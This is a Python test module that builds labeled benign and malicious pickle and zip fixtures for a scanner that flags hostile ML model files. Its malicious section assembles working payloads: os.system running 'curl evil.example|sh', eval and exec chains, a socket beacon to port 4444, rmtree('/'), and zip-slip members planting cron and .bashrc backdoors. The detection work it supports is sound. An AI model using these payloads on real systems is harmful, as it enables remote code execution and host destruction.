"""Labeled artifact corpus for the L0 quality gate (docs/18 Phase 0).

Test-only, deliberately not shipped in the package: it is the definition of
what we consider benign and hostile, and it belongs next to the gate that
enforces it.

The corpus is a *generator*, not a directory of checked-in binaries. Bytes in
git cannot be reviewed — nobody can tell from a diff whether `fixture_07.pkl`
changed from harmless to hostile. Here, every artifact is assembled by code a
reviewer can read.

Two kinds of fixture:

  AUTHENTIC  produced by `pickle.dumps` on real Python objects. Whatever these
             emit is what pickle genuinely emits, with no judgement from us.

  FAITHFUL   hand-assembled opcode streams naming the exact globals that
             torch / numpy / sklearn emit, because those packages are not
             installed in CI and pulling ~2 GB of wheels to obtain twelve
             module names would be a poor trade.

The FAITHFUL fixtures are the corpus's weak point and should be read as such:
they are correct about *which globals appear*, which is all the allowlist
judges, but they are not byte-identical to a real checkpoint. Before Phase 1
sign-off this corpus should be augmented with a handful of genuinely
downloaded artifacts. That task is tracked in the module-level TODO below.

TODO(phase-1): add real downloaded artifacts — a sentence-transformers
MiniLM, an sklearn joblib, a torchvision checkpoint — behind a network-gated
pytest marker so CI stays offline by default.
"""

from __future__ import annotations

import collections
import datetime
import decimal
import functools
import io
import pathlib
import pickle
import uuid
import zipfile
from dataclasses import dataclass, field

# --------------------------------------------------------------------------
# a minimal pickle assembler
#
# Only what the fixtures need. Every one of these streams is inert as data —
# nothing here ever loads them, and the walker never executes.
# --------------------------------------------------------------------------

def PROTO(n: int) -> bytes:
    return b"\x80" + bytes([n])


STOP = b"."
REDUCE = b"R"
EMPTY_TUPLE = b")"
EMPTY_DICT = b"}"
EMPTY_LIST = b"]"
MARK = b"("
TUPLE = b"t"
NONE = b"N"
MEMOIZE = b"\x94"
STACK_GLOBAL = b"\x93"
BUILD = b"b"
SETITEM = b"s"
APPEND = b"a"


def GLOBAL(module: str, name: str) -> bytes:
    """Protocol 0/2 global reference: the operands travel inline."""
    return b"c" + module.encode() + b"\n" + name.encode() + b"\n"


def SHORT_BINUNICODE(s: str) -> bytes:
    raw = s.encode()
    assert len(raw) < 256
    return b"\x8c" + bytes([len(raw)]) + raw


def stack_global(module: str, name: str) -> bytes:
    """Protocol 4 global reference: operands come off the stack.

    This is the form that defeats a scanner grepping for the `GLOBAL` opcode,
    which is exactly why the corpus carries it.
    """
    return SHORT_BINUNICODE(module) + SHORT_BINUNICODE(name) + STACK_GLOBAL


def BININT1(n: int) -> bytes:
    return b"K" + bytes([n])


def BININT2(n: int) -> bytes:
    return b"M" + n.to_bytes(2, "little")


def call(module: str, name: str, *, protocol4: bool = False, args: bytes = EMPTY_TUPLE) -> bytes:
    """`module.name(*args)` — a GLOBAL/STACK_GLOBAL followed by REDUCE."""
    ref = stack_global(module, name) if protocol4 else GLOBAL(module, name)
    return ref + args + REDUCE


def pickle_stream(*chunks: bytes, protocol: int = 4) -> bytes:
    return PROTO(protocol) + b"".join(chunks) + STOP


def zip_archive(members: list[tuple[str, bytes]]) -> bytes:
    """Build a zip in memory, preserving member names verbatim.

    `zipfile` writes whatever name it is given, including '..' and absolute
    paths, which is what makes the traversal fixtures possible.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in members:
            zf.writestr(name, data)
    return buf.getvalue()


# --------------------------------------------------------------------------
# fixture record
# --------------------------------------------------------------------------


@dataclass
class Fixture:
    id: str
    label: str                 # "benign" | "malicious"
    filename: str
    data: bytes
    note: str = ""
    # Rule ids this fixture is expected to trigger. Empty for benign fixtures.
    expect_rules: tuple[str, ...] = ()
    # Provenance of the fixture itself — see the module docstring.
    kind: str = "authentic"    # "authentic" | "faithful"
    first_party_prefixes: tuple[str, ...] = field(default_factory=tuple)


# --------------------------------------------------------------------------
# BENIGN — authentic pickles of real Python objects
# --------------------------------------------------------------------------


class _Cfg:
    """A stand-in for a project's own class. Module-level because pickle can
    only reference a class by import path — which is the whole point: custom
    classes travel as `module.Name` and land in 'unrecognized'."""

    def __init__(self):
        self.lr = 3e-4
        self.layers = [64, 128, 64]


def _benign_authentic() -> list[Fixture]:
    shared = {"shared": True}

    items: list[tuple[str, object, int, str]] = [
        ("benign-dict", {"epochs": 10, "lr": 0.001, "name": "baseline"}, 4,
         "plain config dict — the most ordinary artifact there is"),
        ("benign-nested", {"a": [1, 2, {"b": (3, 4)}], "c": {"d": [5, 6]}}, 4,
         "nested containers"),
        ("benign-ordereddict",
         collections.OrderedDict([("layer1.weight", [0.1, 0.2]), ("layer1.bias", [0.0])]), 4,
         "OrderedDict — what every torch state_dict is at the top level"),
        ("benign-stdlib-types",
         {"when": datetime.datetime(2026, 8, 8, 12, 0, tzinfo=datetime.timezone.utc),
          "d": decimal.Decimal("1.25"),
          "id": uuid.UUID("12345678-1234-5678-1234-567812345678"),
          "when_date": datetime.date(2026, 8, 8)}, 4,
         "datetime/decimal/uuid all reduce through globals"),
        ("benign-proto0-bytes", {"blob": b"\x00\x01\x02binary"}, 0,
         ("HARD NEGATIVE: protocol 0 routes bytes through _codecs.encode, which "
         "also appears in obfuscated payloads")),
        ("benign-sets", {"tags": {"a", "b"}, "frozen": frozenset({1, 2}), "z": complex(1, 2)}, 4,
         "set/frozenset/complex reduce through builtins"),
        ("benign-partial", functools.partial(len), 4,
         ("HARD NEGATIVE: functools.partial is a wrapper payloads abuse and "
         "legitimate objects rely on")),
        ("benign-pathlib", {"cache": pathlib.PurePosixPath("/var/cache/models")}, 4,
         ("HARD NEGATIVE: pathlib.Path is allowed by name; the gadget is "
         "operator.methodcaller, which is denied")),
        ("benign-exception", {"last_error": ValueError("bad shape")}, 4,
         "exception objects reduce through builtins"),
        ("benign-custom-class", _Cfg(), 4,
         ("a project's own class — lands in 'unrecognized', which must stay "
         "below the alert bar or every custom nn.Module trips the detector")),
        ("benign-memo-reuse", {"a": shared, "b": shared, "c": [shared, shared]}, 4,
         "memo get/put traffic — exercises the shadow stack's memo path"),
        ("benign-bignum", {"big": 2**200, "neg": -(2**100), "f": 1e308}, 4,
         "LONG1/LONG4 and float pushes"),
    ]

    out = []
    for fid, obj, proto, note in items:
        out.append(Fixture(
            id=fid, label="benign", filename=f"{fid}.pkl",
            data=pickle.dumps(obj, protocol=proto), note=note, kind="authentic",
        ))
    return out


# --------------------------------------------------------------------------
# BENIGN — faithful reconstructions of framework output
# --------------------------------------------------------------------------

# The globals a real torch state_dict emits inside data.pkl.
_TORCH_STATE_DICT = pickle_stream(
    call("collections", "OrderedDict"),
    MEMOIZE,
    call("torch._utils", "_rebuild_tensor_v2",
         args=MARK + GLOBAL("torch", "FloatStorage") + BININT1(0) + TUPLE),
    call("torch._utils", "_rebuild_tensor_v2",
         args=MARK + GLOBAL("torch", "LongStorage") + BININT1(1) + TUPLE),
)

_TORCH_FULL_MODULE = pickle_stream(
    call("collections", "OrderedDict"),
    call("torch.nn.modules.container", "Sequential"),
    call("torch.nn.modules.linear", "Linear"),
    call("torch.nn.modules.activation", "ReLU"),
    call("torch.nn.modules.batchnorm", "BatchNorm1d"),
    call("torch._utils", "_rebuild_parameter"),
    call("torch._utils", "_rebuild_tensor_v2"),
    call("torch", "device"),
)

_NUMPY_ARRAY = pickle_stream(
    call("numpy.core.multiarray", "_reconstruct",
         args=MARK + GLOBAL("numpy", "ndarray") + BININT1(0) + TUPLE),
    call("numpy", "dtype"),
    call("numpy.core.multiarray", "scalar"),
)

_SKLEARN_JOBLIB = pickle_stream(
    call("sklearn.linear_model._logistic", "LogisticRegression"),
    call("sklearn.preprocessing._data", "StandardScaler"),
    call("copyreg", "_reconstructor",
         args=MARK + GLOBAL("numpy", "ndarray") + BININT1(0) + TUPLE),
    call("numpy.core.multiarray", "_reconstruct"),
    call("numpy", "dtype"),
)

_SENTENCE_TRANSFORMERS = pickle_stream(
    call("collections", "OrderedDict"),
    call("sentence_transformers.models.Transformer", "Transformer"),
    call("sentence_transformers.models.Pooling", "Pooling"),
    call("transformers.models.bert.modeling_bert", "BertModel"),
    call("transformers.configuration_utils", "PretrainedConfig"),
    call("tokenizers", "Tokenizer"),
    call("torch._utils", "_rebuild_tensor_v2"),
)

_XGBOOST = pickle_stream(
    call("xgboost.sklearn", "XGBClassifier"),
    call("xgboost.core", "Booster"),
    call("numpy.core.multiarray", "_reconstruct"),
)

_SCIPY_SPARSE = pickle_stream(
    call("scipy.sparse._csr", "csr_matrix"),
    call("numpy.core.multiarray", "_reconstruct"),
    call("numpy", "dtype"),
)

# A project's own model class. Unrecognized by construction — the point of the
# fixture is that unrecognized must not clear the alert bar.
_FIRST_PARTY = pickle_stream(
    call("collections", "OrderedDict"),
    call("acme_ml.models.encoder", "TextEncoder"),
    call("acme_ml.layers", "RotaryAttention"),
    call("torch._utils", "_rebuild_tensor_v2"),
)

# HARD NEGATIVE. A class defined in the training script itself pickles as
# `__main__.Name`. This is one of the most common shapes a real checkpoint
# takes and it is unrecognizable by construction — no allowlist can ever
# contain it. If "unknown" ever escalates to an alert, every research team on
# the planet gets paged on their own model.
_MAIN_MODULE_CLASS = pickle_stream(
    call("collections", "OrderedDict"),
    call("__main__", "MyTransformer"),
    call("__main__", "PositionalEncoding"),
    call("torch._utils", "_rebuild_tensor_v2"),
)

# HARD NEGATIVE. Real, popular ML packages that are simply not on the
# allowlist — because no allowlist is ever complete. The design has to stay
# safe while incomplete, and this fixture is what proves it does.
_UNLISTED_ECOSYSTEM = pickle_stream(
    call("collections", "OrderedDict"),
    call("some_vendor_sdk.models", "ProprietaryEncoder"),
    call("internal_research.blocks", "GatedMLP"),
    call("torch._utils", "_rebuild_tensor_v2"),
)

# A realistic torch>=1.6 checkpoint: zip with data.pkl plus storage members.
_TORCH_ZIP_CLEAN = zip_archive([
    ("archive/data.pkl", _TORCH_STATE_DICT),
    ("archive/data/0", b"\x00" * 512),
    ("archive/data/1", b"\x01" * 512),
    ("archive/version", b"3\n"),
])

_ST_HEADER = (b'{"weight":{"dtype":"F32","shape":[4,4],"data_offsets":[0,64]},'
              b'"__metadata__":{"format":"pt"}}')
_SAFETENSORS = len(_ST_HEADER).to_bytes(8, "little") + _ST_HEADER + b"\x00" * 64


def _benign_faithful() -> list[Fixture]:
    specs = [
        ("benign-torch-state-dict", "model.pt", _TORCH_STATE_DICT,
         "torch state_dict globals: OrderedDict + _rebuild_tensor_v2 + storages", ()),
        ("benign-torch-module", "model_full.pth", _TORCH_FULL_MODULE,
         "a whole nn.Module pickled by reference — many torch.* class names", ()),
        ("benign-numpy", "embeddings.npy", _NUMPY_ARRAY,
         "numpy reconstruct path", ()),
        ("benign-sklearn-joblib", "classifier.joblib", _SKLEARN_JOBLIB,
         "sklearn via joblib — pure pickle underneath", ()),
        ("benign-sentence-transformers", "st_model.bin", _SENTENCE_TRANSFORMERS,
         "the RAG embedder case: the model most 'we only call the API' apps load", ()),
        ("benign-xgboost", "booster.pkl", _XGBOOST, "gradient-boosting model", ()),
        ("benign-scipy-sparse", "tfidf.pkl", _SCIPY_SPARSE, "scipy sparse matrix", ()),
        ("benign-first-party", "encoder.pt", _FIRST_PARTY,
         "customer's own classes, declared first-party", ("acme_ml.",)),
        ("benign-main-module-class", "run1.pt", _MAIN_MODULE_CLASS,
         ("HARD NEGATIVE: classes defined in a training script pickle as "
         "__main__.Name and can never be allowlisted"), ()),
        ("benign-unlisted-ecosystem", "model.pt", _UNLISTED_ECOSYSTEM,
         ("HARD NEGATIVE: real packages absent from the allowlist — the detector "
         "must stay safe while the allowlist is incomplete, which is always"), ()),
        ("benign-torch-zip", "checkpoint.pt", _TORCH_ZIP_CLEAN,
         "realistic torch zip container with storage members", ()),
    ]
    out = [
        Fixture(id=fid, label="benign", filename=fname, data=data, note=note,
                kind="faithful", first_party_prefixes=fp)
        for fid, fname, data, note, fp in specs
    ]
    out.append(Fixture(
        id="benign-safetensors", label="benign", filename="model.safetensors",
        data=_SAFETENSORS, note="inert format — must produce nothing at all",
        kind="faithful",
    ))
    return out


# --------------------------------------------------------------------------
# MALICIOUS
# --------------------------------------------------------------------------


def _malicious() -> list[Fixture]:
    out: list[Fixture] = []

    def add(fid, filename, data, note, rules, kind="faithful"):
        out.append(Fixture(id=fid, label="malicious", filename=filename, data=data,
                           note=note, expect_rules=rules, kind=kind))

    # -- direct execution ---------------------------------------------------
    add("mal-os-system", "model.pkl",
        pickle_stream(call("os", "system",
                           args=MARK + SHORT_BINUNICODE("curl evil.example|sh") + TUPLE)),
        "the textbook payload", ("ARG-ART-002",))

    add("mal-os-system-stack-global", "model.pkl",
        pickle_stream(call("os", "system", protocol4=True,
                           args=MARK + SHORT_BINUNICODE("id") + TUPLE)),
        "same call via STACK_GLOBAL — invisible to a scanner grepping for GLOBAL",
        ("ARG-ART-002",))

    add("mal-posix-system", "model.pkl",
        pickle_stream(call("posix", "system")),
        "the C module behind os — evades a name-only check against 'os'",
        ("ARG-ART-002",))

    add("mal-subprocess-popen", "weights.bin",
        pickle_stream(call("subprocess", "Popen",
                           args=MARK + SHORT_BINUNICODE("/bin/sh") + TUPLE)),
        "subprocess spawn", ("ARG-ART-002",))

    add("mal-builtins-eval", "model.pkl",
        pickle_stream(call("builtins", "eval",
                           args=MARK + SHORT_BINUNICODE("__import__('os').system('id')") + TUPLE)),
        "eval of a source string", ("ARG-ART-002",))

    add("mal-types-codetype", "model.pkl",
        pickle_stream(call("types", "CodeType"), call("types", "FunctionType")),
        "raw bytecode assembled into a callable — the classic pickle RCE",
        ("ARG-ART-002",))

    add("mal-runpy", "ckpt.pth",
        pickle_stream(call("runpy", "_run_code")),
        "run a code object in a fresh namespace", ("ARG-ART-002",))

    add("mal-ctypes", "model.pkl",
        pickle_stream(call("ctypes", "CDLL",
                           args=MARK + SHORT_BINUNICODE("/tmp/payload.so") + TUPLE)),
        "native payload via ctypes", ("ARG-ART-002",))

    add("mal-nested-pickle", "model.pkl",
        pickle_stream(call("pickle", "loads")),
        "second-stage pickle nested inside the first", ("ARG-ART-002",))

    add("mal-webbrowser", "model.pkl",
        pickle_stream(call("webbrowser", "open",
                           args=MARK + SHORT_BINUNICODE("http://evil.example") + TUPLE)),
        "low-effort but real; also the antigravity trick", ("ARG-ART-002",))

    # -- indirect execution -------------------------------------------------
    add("mal-methodcaller-gadget", "model.pkl",
        pickle_stream(
            call("operator", "methodcaller",
                 args=MARK + SHORT_BINUNICODE("system") + TUPLE),
            call("builtins", "getattr"),
        ),
        "gadget chain: reach a dangerous method without ever naming it",
        ("ARG-ART-002",))

    # -- network -------------------------------------------------------------
    add("mal-socket", "model.pkl",
        pickle_stream(call("socket", "create_connection",
                           args=MARK + SHORT_BINUNICODE("10.0.0.1") + BININT2(4444) + TUPLE)),
        "reverse shell / beacon", ("ARG-ART-003",))

    add("mal-urlopen", "model.pkl",
        pickle_stream(call("urllib.request", "urlopen",
                           args=MARK + SHORT_BINUNICODE("http://evil.example/s2") + TUPLE)),
        "second-stage download at load time", ("ARG-ART-003",))

    add("mal-requests-post", "model.pkl",
        pickle_stream(call("requests", "post")),
        "exfiltration of whatever the process can reach", ("ARG-ART-003",))

    # -- filesystem ----------------------------------------------------------
    add("mal-shutil-rmtree", "model.pkl",
        pickle_stream(call("shutil", "rmtree",
                           args=MARK + SHORT_BINUNICODE("/") + TUPLE)),
        "destructive", ("ARG-ART-004",))

    add("mal-os-remove", "model.pkl",
        pickle_stream(call("os", "remove"), call("os", "chmod")),
        "tampering with the host", ("ARG-ART-004",))

    # -- staged / obfuscated -------------------------------------------------
    add("mal-b64-exec-chain", "model.pkl",
        pickle_stream(
            call("base64", "b64decode",
                 args=MARK + SHORT_BINUNICODE("aW1wb3J0IG9z") + TUPLE),
            call("builtins", "exec"),
        ),
        "staged: decode then exec — must raise BOTH the exec finding and the "
        "obfuscation corroborator",
        ("ARG-ART-002", "ARG-ART-015"))

    add("mal-zlib-stage", "model.pkl",
        pickle_stream(call("zlib", "decompress"), call("builtins", "eval")),
        "compressed second stage", ("ARG-ART-002", "ARG-ART-015"))

    # -- archive-level -------------------------------------------------------
    add("mal-zip-traversal", "checkpoint.pt",
        zip_archive([
            ("archive/data.pkl", _TORCH_STATE_DICT),
            ("../../../../tmp/.bashrc", b"curl evil.example | sh\n"),
            ("archive/data/0", b"\x00" * 64),
        ]),
        "zip-slip applied to a checkpoint", ("ARG-ART-006",))

    add("mal-zip-absolute-path", "checkpoint.pt",
        zip_archive([
            ("archive/data.pkl", _TORCH_STATE_DICT),
            ("/etc/cron.d/backdoor", b"* * * * * root curl evil.example|sh\n"),
        ]),
        "absolute path member", ("ARG-ART-006",))

    add("mal-zip-native-lib", "checkpoint.pt",
        zip_archive([
            ("archive/data.pkl", _TORCH_STATE_DICT),
            ("archive/libhelper.so", b"\x7fELF" + b"\x00" * 128),
            ("archive/setup.py", b"import os; os.system('id')\n"),
        ]),
        "executable content riding inside a weights archive", ("ARG-ART-007",))

    # -- the realistic smuggling case ---------------------------------------
    add("mal-torch-zip-payload", "pytorch_model.bin",
        zip_archive([
            ("archive/data.pkl", pickle_stream(
                call("collections", "OrderedDict"),
                call("torch._utils", "_rebuild_tensor_v2"),
                call("os", "system",
                     args=MARK + SHORT_BINUNICODE("curl evil.example|sh") + TUPLE),
            )),
            ("archive/data/0", b"\x00" * 1024),
            ("archive/version", b"3\n"),
        ]),
        "MODEL SMUGGLING: a checkpoint that looks entirely normal apart from one "
        "extra global buried in data.pkl",
        ("ARG-ART-002",))

    # -- malformed ------------------------------------------------------------
    # Truncation lands AFTER the dangerous global is complete. Cutting mid-GLOBAL
    # would test nothing: an operand that never arrived cannot be read, and
    # ARG-ART-016 alone is the correct answer there. The case worth pinning is
    # the one where a payload is fully decodable and the stream then breaks —
    # the walker must report both, not abandon what it already had.
    add("mal-truncated", "model.pkl",
        PROTO(4) + GLOBAL("os", "system") + EMPTY_TUPLE + REDUCE
        + b"\x8c" + bytes([200]) + b"short",   # claims 200 bytes, supplies 5
        "payload decodes, then the stream breaks: must report BOTH the global "
        "and the incomplete walk",
        ("ARG-ART-002", "ARG-ART-016"))

    add("mal-garbage-tail", "model.pkl",
        PROTO(4) + GLOBAL("subprocess", "run") + b"\xff\xfe\xfd\xfc garbage",
        "junk after a real global — a parser that gives up early must not "
        "report clean",
        ("ARG-ART-002", "ARG-ART-016"))

    return out


# --------------------------------------------------------------------------


def load_corpus() -> list[Fixture]:
    return _benign_authentic() + _benign_faithful() + _malicious()
